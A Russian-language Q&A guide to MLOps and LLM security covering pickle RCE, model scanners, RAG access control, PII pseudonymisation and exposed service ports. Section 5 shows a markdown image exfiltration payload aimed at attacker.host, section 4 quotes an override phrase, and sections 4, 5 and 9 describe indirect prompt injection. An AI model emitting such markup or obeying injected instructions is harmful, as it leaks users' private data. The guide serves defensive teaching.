# 1. Какие специализированные базы уязвимостей и матрицы угроз существуют для
MLOps и AI-систем?
1. **Huntr (`huntr.com` / Protect AI Vulnerability Database):** крупнейшая база
   реальных CVE и эксплойтов в open-source MLOps-инструментах (`MLflow`,
   `Ollama`, `llama.cpp`, `vLLM`, `Ray`, `ClearML`, `LangChain`).
2. **OWASP Top 10 for Large Language Model Applications:** 10 главных рисков
   LLM-приложений (`Prompt Injection`, `Sensitive Info Disclosure`, `Supply
   Chain`, `Excessive Agency` и др.).
3. **OWASP Machine Learning Security Top 10:** угрозы классического ML (`Data
   Poisoning`, `Model Inversion`, `Membership Inference`, `Unsafe
   Deserialization`).
4. **MITRE ATLAS:** матрица тактик и техник атак на ИИ-системы (аналог MITRE
   ATT&CK).
5. **AI Incident Database (`incidentdatabase.ai`):** реестр реальных публичных
   инцидентов с ИИ.

# 2. Как технически работает уязвимость удаленного выполнения кода (RCE) внутри
файлов моделей `.pkl` / `.pt` и почему их не видит обычный `Trivy`?
Обычные сканеры (`Trivy`, `Grype`) ищут CVE в системных пакетах (`apt`/`apk`) и
зависимостях `pyproject.toml`, но не анализируют бинарные веса моделей. Формат
`Pickle` — это стековая виртуальная машина: при вызове `pickle.load()` или
`torch.load()` опкоды `GLOBAL`/`STACK_GLOBAL` импортируют любую функцию Python
(например, `os.system` или `subprocess.Popen`), а опкод `REDUCE` немедленно
вызывает её с аргументами со стека прямо во время чтения файла.

# 3. Как проверить скачанный файл весов модели на безопасность в CI/CD без его
загрузки в память (`ModelScan` и `Fickling`)?
Используют статические анализаторы байткода и графов моделей:
- **ModelScan (Protect AI):** сканирует файлы `.pkl`, `.pt`, `.bin`, `.h5` и
  TensorFlow `SavedModel` без выполнения кода, блокируя пайплайн при
  обнаружении опасных системных импортов (`os`, `subprocess`, `socket`, `eval`)
  или `Lambda`-слоев.
- **Fickling (Trail of Bits):** дизассемблирует опкоды виртуальной машины
  Pickle (`pickletools.genops`) и строит AST-дерево Python-кода, который был бы
  выполнен при десериализации.
- Лучшая защита — использовать только декларативные форматы без поддержки кода:
  **`safetensors`**, **`ONNX`**, **`GGUF`** или флаг `torch.load(...,
  weights_only=True)`.

# 4. В чем разница между `Direct Prompt Injection` и `Indirect Prompt
Injection` в RAG-системах?
- **Direct Prompt Injection:** сам пользователь в окне чата вводит инструкцию,
  пытающуюся переопределить системный промпт (`"Забудь правила и..."`).
- **Indirect Prompt Injection (непрямая инъекция через данные):** сам
  пользователь добросовестен, но в базу знаний RAG попадает внешний документ
  (присланный по почте PDF-счет, резюме или веб-страница), внутри которого
  скрыта инструкция для LLM. Когда этот чанк извлекается из векторной БД в
  контекст, модель выполняет команду атакующего, имея доступ ко всем остальным
  приватным документам пользователя в этом же окне контекста.

# 5. Как злоумышленник может украсть данные из ответа LLM в браузере, если у
самой модели нет доступа к вызову внешних API и инструментов?
Через атаку **Markdown Image Exfiltration**: вредоносная инструкция внутри
документа заставляет LLM вставить в ответ Markdown-разметку картинки:
`![img](https://attacker.host/collect?inn=<найденный_в_контексте_ИНН>)`.
Когда фронтенд чата рендерит ответ в HTML-тег `<img src="...">`, браузер
жертвы автоматически отправляет GET-запрос на сервер атакующего вместе с
секретными данными в URL. Защита: жесткий заголовок **Content Security Policy
(`img-src 'self'`)** и фильтрация внешних ссылок на выходе.

# 6. Почему в многопользовательском RAG нельзя ограничивать доступ к чужим
документам инструкцией в системном промпте?
Потому что LLM — вероятностная модель, у которой нет аппаратного разделения
между инструкциями и данными. Любой текст, попавший в её окно контекста, может
быть вытянут через джейлбрейк или переформулирование. Разграничение прав
доступа (**RBAC / ACL**) должно выполняться детерминированным кодом **до вызова
LLM** на уровне жесткого фильтра метаданных в векторной БД (`Qdrant Filter:
must=[FieldCondition(key="owner_id", ...)]`).

# 7. Как защитить персональные данные (СНИЛС, ИНН, паспорт, ФИО, телефоны) при
работе с LLM и логами трейсинга (`Langfuse`)?
1. **Local-First контур:** обрабатывать чувствительные документы локальными
   моделями (`ONNX Runtime` + `Ollama` / `vLLM` внутри своего периметра).
2. **Обратимая псевдонимизация (`Microsoft Presidio` + regex для документов
   РФ):** перед отправкой текста в LLM или систему логирования заменять
   реальные ПДн на типизированные плейсхолдеры (`<RU_SNILS_1>`, `<RU_INN_1>`,
   `<PERSON_1>`), сохраняя словарь соответствий только в локальной памяти
   запроса для обратной подстановки в финальный ответ.

# 8. Для чего используется инструмент `NVIDIA Garak` в пайплайнах безопасности
LLM?
`Garak` — это автоматический сканер уязвимостей и фреймворк **Red-Teaming** для
LLM (аналог `nmap`/`metasploit` для языковых моделей). Он автоматически
прогоняет сотни зондов (`probes`): известные джейлбрейки (`DAN`), инъекции с
кодированием (`Base64`, `ROT13`), попытки вызвать генерацию вредоносного кода,
галлюцинации несуществующих пакетов (`Package Hallucination`) и утечки ПДн,
формируя отчет о пробитых защитах до релиза модели.

# 9. Что такое уязвимость `Excessive Agency (LLM06)` из списка OWASP LLM Top 10
и как от неё защититься?
Возникает, когда LLM-агенту предоставляют инструменты (`function calling` /
MCP) с избыточными правами (например, чтение/запись любых таблиц в БД, вызов
shell-скриптов, отправка писем) и разрешают выполнять их без участия человека.
При успешной `Indirect Prompt Injection` атакующий перехватывает управление
этими инструментами.
**Защита:**
1. Давать инструментам минимальные права (`SELECT`-пользователь БД с `LIMIT`,
   узкие типизированные функции вместо сырого SQL/bash).
2. Требовать явного подтверждения человека (**Human-in-the-Loop**) для любых
   мутирующих или внешних операций.

# 10. Чем отличаются атаки `Data Poisoning`, `Model Inversion` и `Membership
Inference`?
- **Data Poisoning (отравление данных):** внедрение вредоносных примеров в
  обучающий корпус для смещения предсказаний или создания скрытого бэкдора
  (триггера).
- **Membership Inference:** определение атакующим по уровню уверенности модели
  (`predict_proba`), присутствовала ли конкретная запись (например, карточка
  конкретного пациента) в обучающей выборке.
- **Model Inversion / Extraction:** восстановление приватных признаков обучающей
  выборки или клонирование весов чужой закрытой модели через массовые запросы к
  её API (`Distillation attack`).

# 11. Какие реальные угрозы несет открытие портов `MLflow (:5000)`, `Ollama
(:11434)` и `Ray (:8265)` в сеть без аутентификации?
В стандартной поставке эти сервисы не имеют встроенной строгой авторизации:
- открытый **`Ray Dashboard (:8265)`** позволяет любому пользователю сети
  отправить задачу `ray job submit` и выполнить произвольный bash/Python-код на
  всех GPU-серверах;
- открытый **`Ollama (:11434)`** позволяет выкачивать/удалять модели и забивать
  вычислительные ресурсы;
- в **`MLflow (:5000)`** неавторизованный доступ открывает все модели в S3 и
  исторически содержал десятки CVE класса `Path Traversal` / `LFI`.
Все эти сервисы должны быть закрыты `NetworkPolicy`, слушать `127.0.0.1` или
стоять за Reverse Proxy с аутентификацией (`OAuth2 Proxy` / mTLS).

# 12. Что такое атака `Package Hallucination (Slopsquatting)` при использовании
LLM для генерации кода и пайплайнов?
Языковые модели при генерации инструкций установки (`pip install ...`, `npm
install ...`) иногда выдумывают правдоподобно звучащие, но не существующие в
природе названия пакетов (галлюцинации). Злоумышленники массово выявляют такие
популярные галлюцинации моделей и регистрируют одноименные пакеты с вредоносным
кодом в публичных `PyPI` / `npm`. Защита в MLOps: использовать корпоративное
прокси-зеркало пакетов с белым списком и строго фиксировать зависимости в
`uv.lock` с проверкой хэшей (`--frozen`).
